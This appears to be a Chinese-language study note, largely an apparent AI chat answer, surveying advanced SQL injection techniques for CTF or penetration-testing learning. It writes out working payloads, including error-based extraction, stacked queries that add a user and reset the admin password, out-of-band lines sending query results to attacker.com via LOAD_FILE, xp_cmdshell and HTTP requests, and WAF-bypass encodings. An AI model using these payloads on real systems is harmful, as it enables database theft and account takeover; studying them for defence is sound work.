大思路

1.找到注入点
2.根据题目限制构造特定注入payload
3.查库、表、列、字段值




-----

          
好的，你问到了一个非常核心的问题：在SQL注入中，除了我们讨论的 `GROUP BY ... WITH ROLLUP` 结合弱类型比较这种高级用法，还有哪些类似的、经常用到的SQL高级用法和技巧？

SQL注入是一个非常广阔的领域，当面对严格的过滤和限制时，攻击者会利用各种数据库特性和绕过技术。下面我将列举一些常见的SQL高级用法和注入技巧，并解释它们的原理和适用场景。

### 1. 时间盲注 (Time-based Blind SQL Injection)

*   **原理：** 当布尔盲注（通过页面内容变化判断真假）不可行，或者页面内容变化不明显时，攻击者可以通过注入一个会引起数据库延迟的SQL语句来判断条件的真假。如果条件为真，数据库会延迟响应；如果条件为假，则立即响应。通过测量响应时间来推断信息。
*   **场景：**
    *   没有错误信息回显。
    *   页面内容无论条件真假都保持一致。
    *   无法通过 `UNION SELECT` 或布尔盲注获取信息。
*   **利用方式：**
    *   **MySQL/PostgreSQL：** `IF(condition, SLEEP(N), 0)` 或 `pg_sleep(N)`
    *   **SQL Server：** `IF condition WAITFOR DELAY '0:0:N'`
    *   **Payload 示例 (MySQL)：**
        `id=1 AND IF(SUBSTR(DATABASE(),1,1)='a', SLEEP(5), 0)`
        如果数据库名的第一个字符是 'a'，页面会延迟5秒响应。
*   **优劣：**
    *   **优点：** 几乎在任何SQL注入场景下都适用，只要能注入SQL语句。隐蔽性较好。
    *   **缺点：** 效率极低，需要发送大量请求，耗时很长。容易被WAF识别为异常流量。

### 2. 报错注入 (Error-based SQL Injection)

*   **原理：** 攻击者构造恶意的SQL语句，利用数据库的某些函数或特性，使其在执行时产生错误，并将查询结果或敏感信息包含在错误信息中回显到页面上。
*   **场景：**
    *   Web应用程序会显示数据库的详细错误信息。
    *   无法使用 `UNION SELECT`（例如，列数不匹配或过滤严格）。
*   **利用方式：**
    *   **MySQL (常用函数)：**
        *   `updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)`
        *   `extractvalue(1,concat(0x7e,(SELECT user()),0x7e))`
        *   `floor((SELECT @@version)) + rand(0)*2` (结合 `GROUP BY` 报错)
    *   **SQL Server：** `CONVERT(int, (SELECT @@version))`
    *   **Payload 示例 (MySQL)：**
        `id=1 AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)`
        如果成功，页面会显示类似 `XPATH syntax error: '~[数据库名]~'` 的错误信息。
*   **优劣：**
    *   **优点：** 效率高，可以直接从错误信息中获取数据。
    *   **缺点：** 依赖于应用程序显示详细错误信息，如果错误信息被屏蔽则无效。容易被WAF检测。

### 3. 带外注入 (Out-of-Band, OOB SQL Injection)

*   **原理：** 当无法通过页面回显或时间延迟获取数据时，攻击者利用数据库的某些功能（如DNS查询、HTTP请求）将查询结果发送到攻击者控制的外部服务器。
*   **场景：**
    *   严格的过滤，无法进行布尔盲注或报错注入。
    *   数据库服务器可以发起外部网络请求（DNS、HTTP）。
*   **利用方式：**
    *   **MySQL (利用DNS查询)：** `LOAD_FILE('\\\\attacker.com\\share')` (Windows) 或 `SELECT LOAD_FILE(CONCAT('\\\\', (SELECT DATABASE()), '.attacker.com\\'))`
        *   **注意：** `LOAD_FILE` 需要 `FILE` 权限，且在Linux上通常无法触发DNS请求。
        *   更常见的是利用 `DNS_LOAD_FILE` 或 `UTL_HTTP` (Oracle) 等函数。
    *   **SQL Server (利用DNS查询或HTTP请求)：** `EXEC master..xp_cmdshell 'ping -n 1 [查询结果].attacker.com'` 或 `EXEC sp_OACreate 'MSXML2.ServerXMLHttp', @obj OUT; EXEC sp_OAMethod @obj, 'open', NULL, 'GET', 'http://attacker.com/?data=' + (SELECT @@version), FALSE; EXEC sp_OAMethod @obj, 'send';`
    *   **Payload 示例 (MySQL，利用DNSlog)：**
        `id=1 AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT DATABASE()),'.your_dnslog_domain\\')))`
        攻击者在 `your_dnslog_domain` 的DNS日志中会看到一个包含数据库名的DNS查询记录。
*   **优劣：**
    *   **优点：** 绕过能力强，在非常严格的过滤环境下也能获取数据。
    *   **缺点：** 依赖于数据库服务器的网络配置和权限。配置和利用相对复杂。

### 4. 堆叠查询 (Stacked Queries SQL Injection)

*   **原理：** 攻击者在原始SQL语句后添加分号 `;`，然后拼接新的SQL语句。数据库会按顺序执行这些语句。
*   **场景：**
    *   数据库API支持多语句执行（例如 `mysqli_multi_query()` 在PHP中）。
    *   可以执行任意SQL语句，包括数据插入、更新、删除，甚至创建用户、执行系统命令等。
*   **利用方式：**
    *   **Payload 示例：**
        `id=1; INSERT INTO users (username, password) VALUES ('hacker', 'password');`
        `id=1; UPDATE users SET password='new_password' WHERE username='admin';`
        `id=1; SELECT SLEEP(5);` (可以结合时间盲注)
*   **优劣：**
    *   **优点：** 功能强大，可以执行任意SQL操作，包括数据修改和控制流。
    *   **缺点：** 并非所有数据库API都支持堆叠查询。例如，PHP的 `mysqli_query()` 默认不支持，需要使用 `mysqli_multi_query()`。

### 5. 二次注入 (Second-Order SQL Injection)

*   **原理：** 攻击者第一次注入的数据被存储到数据库中，但在存储时可能经过了转义，看起来是安全的。然而，当这些被存储的数据在后续的某个操作中被取出，并再次用于构造新的SQL查询时，如果没有再次进行适当的转义，就会触发注入。
*   **场景：**
    *   用户注册、个人资料修改等功能，数据先存储后使用。
    *   例如，注册时输入 `username='admin'--`，被转义后存储为 `\'admin\'--`。但在某个显示用户列表的功能中，如果直接 `SELECT * FROM users WHERE username = '$stored_username'`，就会触发注入。
*   **利用方式：**
    *   **步骤1：** 注入恶意数据并使其存储到数据库。
    *   **步骤2：** 触发一个使用该存储数据的操作，导致注入被执行。
*   **优劣：**
    *   **优点：** 隐蔽性强，难以发现。可以绕过前端和首次后端过滤。
    *   **缺点：** 利用流程复杂，需要对应用程序的业务逻辑有深入理解。

### 6. 高级绕过技术 (Advanced Bypass Techniques)

这些技术通常与上述注入方法结合使用，以绕过WAF或严格的过滤。

*   **编码绕过：**
    *   **URL编码：** `%20` 代替空格，`%27` 代替单引号。
    *   **双重URL编码：** `%2520` 代替空格，`%2527` 代替单引号。
    *   **Unicode编码：** `char(0x27)` 代替 `'`。
    *   **十六进制编码：** `0x41444d494e` 代替 `'ADMIN'`。
    *   **HTML实体编码：** `&#x27;` 代替 `'`。
    *   **场景：** WAF或过滤规则只进行单次解码或不识别某些编码。
*   **混淆绕过：**
    *   **大小写混淆：** `UnIoN SeLeCt` 代替 `UNION SELECT`。
    *   **内联注释：** `UNI/**/ON/**/SEL/**/ECT` 代替 `UNION SELECT`。
    *   **特殊字符作为空格：** `%0a` (换行)、`%0b` (垂直制表符) 等代替空格。
    *   **空白字符变体：** `\t` (制表符)、`\n` (换行符) 等。
    *   **场景：** WAF基于黑名单匹配，可以通过改变关键字形式来绕过。
*   **WAF规则绕过：**
    *   **HTTP参数污染 (HPP)：** 在URL中重复参数，例如 `?id=1&id=2`，服务器可能只取第一个或最后一个，或将它们合并。
    *   **HTTP请求走私 (HTTP Request Smuggling)：** 利用HTTP协议解析差异，将恶意请求隐藏在合法请求中。
    *   **分块传输编码 (Chunked Transfer Encoding)：** 绕过WAF对请求体的完整性检查。
    *   **场景：** 针对特定的WAF产品和其规则进行定制化绕过。

### 7. 数据库特定函数和特性

*   **`GROUP BY ... WITH ROLLUP` (MySQL)：** 如你所提，用于生成汇总行，其中分组列为 `NULL`，结合PHP弱类型比较绕过密码验证。
*   **`CHAR()` / `CONCAT()` (MySQL)：** 当引号被过滤时，使用 `CHAR(ASCII值)` 来构造字符串，再用 `CONCAT()` 拼接。
*   **`SUBSTR(... FROM ... FOR ...)` (MySQL)：** 当逗号被过滤时，用于字符串截取。
*   **`IF()` / `CASE WHEN` (通用)：** 用于构造条件判断，在盲注中非常有用。
*   **`@@version` / `version()` (MySQL)：** 获取数据库版本信息。
*   **`user()` / `current_user()` (MySQL)：** 获取当前数据库用户。
*   **`database()` / `schema()` (MySQL)：** 获取当前数据库名。
*   **`group_concat()` (MySQL)：** 将多行数据连接成一个字符串，在盲注中非常有用。
*   **`information_schema` (MySQL/PostgreSQL)：** 存储数据库元数据（表名、列名等），是获取数据库结构的关键。
*   **`xp_cmdshell` (SQL Server)：** 允许执行操作系统命令，是SQL Server注入中非常强大的功能。
*   **`UTL_HTTP` / `DBMS_XSLT` (Oracle)：** 用于发起HTTP请求，实现带外注入。

### 总结

SQL注入的本质是利用应用程序对用户输入处理不当，将恶意SQL代码注入到数据库查询中。当面对严格的过滤时，攻击者会：

1.  **深入理解数据库特性：** 了解目标数据库的各种函数、语法和行为。
2.  **利用编程语言特性：** 如PHP的弱类型比较。
3.  **结合多种绕过技术：** 编码、混淆、注释等。
4.  **选择合适的注入类型：** 盲注（布尔、时间）、报错、带外等。

这些高级用法和技巧通常需要攻击者具备扎实的SQL知识、对目标数据库的深入了解以及对Web应用程序逻辑的敏锐洞察力。在实际渗透测试中，SQLMap等自动化工具会尝试这些技术，但理解其原理对于手工测试和绕过更复杂的WAF至关重要。
        